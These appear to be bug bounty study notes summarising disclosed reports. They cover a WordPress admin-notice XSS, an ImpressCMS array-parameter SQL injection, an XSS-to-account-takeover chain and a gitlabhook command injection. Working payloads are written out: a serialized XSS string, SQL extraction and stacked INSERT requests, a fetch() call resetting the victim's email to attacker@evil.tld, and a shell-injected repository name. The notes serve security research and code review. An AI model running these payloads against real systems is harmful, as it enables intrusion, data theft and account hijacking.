### [bugbountyhuntingskills.md] 1.1 Write-time vs. read-time sanitization gap — WordPress plugin admin notice

**Source:** HackerOne #3447021 — Automattic / Pressable-Atomic, *"XSS via unescaped admin notices
leads to code execution"*, disclosed 2025-12.

**Core method**
- Read plugin source looking for the asymmetry: value is *stored* safely, but *echoed* raw at render.
- Sink identified: `print_admin_notices()` does `echo $notice[0]` with no `esc_html()`; only the CSS
  class `$notice[1]` passes through `esc_attr()`. The unescaped element is the message string.
- Trace the message back to its source: it is read from the serialized WP option
  `atomic_single_option_limiter_notices`.
- Craft the payload *inside the serialization* rather than as a plain string, so it survives the
  option round-trip:
  `a:1:{s:34:"<script>alert('test')</script>test";a:1:{s:7:"expires";i:1893456000;}}`
  (`s:34` must match the byte length or PHP unserialize drops the value — count carefully).
- Trigger by visiting `/wp-admin/plugins.php`, where notices render for any admin.

**Lesson.** The bug is not "unescaped output" alone — it's that the write path needed a precondition
(ability to set the option) that made the researcher treat it as a privilege-escalation chain, not a
standalone XSS. Always map *who can write the value* and *who renders it*; the severity lives in the
gap between those two identities. `esc_attr()` on one array element while `echo`ing the neighbour is
the classic partial-fix pattern to grep for.

**Transferable test.** For every admin/notification/banner renderer, find which array element is
escaped and which is not. Then find the lowest-privilege role that can write to the backing store.

### [bugbountyhuntingskills.md] 7.1 Array parameter defeats scalar sanitization — ImpressCMS

**Source:** HackerOne #1081145 — ImpressCMS, *"SQL Injection through /include/findusers.php"*,
chained with #1081137 to drop the admin-session requirement. Full writeup:
`karmainsecurity.com/impresscms-from-unauthenticated-sqli-to-rce`.

**Core method**
- Source review of `include/findusers.php` shows `$_POST["groups"]` passed **unfiltered** into two
  handler methods:
  ```php
  $total = $user_handler->getUserCountByGroupLink(@$_POST["groups"], $criteria);
  $foundusers = $user_handler->getUsersByGroupLink(@$_POST["groups"], $criteria, TRUE);
  ```
- The sink is an `implode()` into an `IN (...)` clause:
  ```php
  $sql[] = "m.groupid IN (" . implode(", ", $groups) . ")";
  ```
  `implode` happily joins whatever strings are in the array — there is no `intval()`/`(int)` cast.
- The tell is the **shape** of the parameter: a PHP array (`groups[]=`) rather than a scalar. Scalar
  filters (`is_numeric`, regex on `$_POST['groups']`) frequently assume a string and either error out
  or are skipped entirely when given an array.
- Boolean-based extraction of the users table:
  ```http
  POST /include/findusers.php HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  groups[]=1) AND (SELECT SUBSTRING(email,1,1) FROM users LIMIT 1)='a'-- -
  ```
- The same injection supports **stacked queries** because the driver allows `;`. Create a user
  without knowing the schema beyond the table prefix:
  ```http
  groups[]=1); INSERT INTO i36fd6f18_users (uname) VALUES (0x414243)%23
  ```
  (`%23` = `#`, the MySQL comment that eats the trailing `)`.)
- Unauthenticated reachability came from a *separate* bug (#1081137) that leaked/forged the CSRF
  security token — the PoC fetches the token first, then fires the injection.

**Lesson.** When you see `implode()`/`join()`/`array_map()` feeding a query, test the array form of
the parameter, not just the string form. The exploitable primitive is "user controls N elements of a
SQL list", and every element is an injection point.

**Transferable test.** For every `foo[]`-style parameter, send `foo[]=1)`, `foo[]=1'`, and
`foo[]=1,2)` and compare error/timing/row-count against a single-element control. Then try a stacked
statement with the comment character for the detected backend.

## [bugbountyhuntingskills.md] 12. Account takeover and XSS chains

### [bugbountyhuntingskills.md] 12.1 XSS → email change → ATO (the standard escalation)

**Source:** Bugcrowd, *"10 Technical Tips with Hx01"*; *"Access Control vs Account Takeover"*
(2025-07).

**Core method**
- Confirm the app lets a user change their email **without re-entering the current password**
  (very common in profile settings).
- With any XSS (reflected, stored, DOM, or self-XSS chained to CSRF), issue the email-change request
  from the victim's browser:
  ```js
  fetch('/api/profile/email', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    credentials: 'include',
    body: JSON.stringify({email: 'attacker@evil.tld'})
  })
  ```
- Trigger "forgot password" on the new address → reset → log in as the victim.
- This is what turns a P3 "alert box" into a P2/P1. A report that stops at `alert(document.domain)`
  is routinely downgraded.

**Lesson.** Never report XSS alone if an ATO path exists. The impact section should be the ATO
sequence, with the XSS as step 0.

### [bugbountyhuntingskills.md] 13.3 JSON field → `execFile` without sanitization

**Source:** HackerOne #685447 — `gitlabhook` npm module, CVSS 10.

**Core method**
- `ExecFile` at line 146 passes user input straight through. The webhook body's repository name is
  the injection point:
  ```python
  json = '{"repository":{"name": "Diasporrra\'; %s;\'"}}' % "touch /tmp/poc.txt"
  ```
- Single quote closes the shell string, `;` starts the new command.

**Lesson.** `execFile` is safer than `exec` only when arguments are passed as an **array**. If the
code builds one string and shells out, it is command injection regardless of the API name. Grep for
`child_process.exec`, `execSync`, `spawn(..., {shell:true})`, `Runtime.exec(String)`,
`os.system`, `subprocess(..., shell=True)`.
